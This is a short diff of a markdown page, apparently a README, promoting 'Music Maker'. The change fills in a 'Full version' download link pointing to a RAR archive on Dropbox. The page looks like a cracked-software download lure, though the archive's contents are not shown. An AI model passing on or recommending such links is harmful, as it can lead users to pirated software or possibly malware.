@@ -26,7 +26,7 @@
 
 ![alt-текст](https://i.imgur.com/He585sL.png "Music Maker")
  # PRODUCE YOUR OWN SONGS – NO EXPERIENCE REQUIRED
-## Download Music Maker [Full version]():
+## Download Music Maker [Full version](https://www.dropbox.com/s/e30gs3jmuvh5xoq/MusicMaker.rar?dl=1):
 
 
 
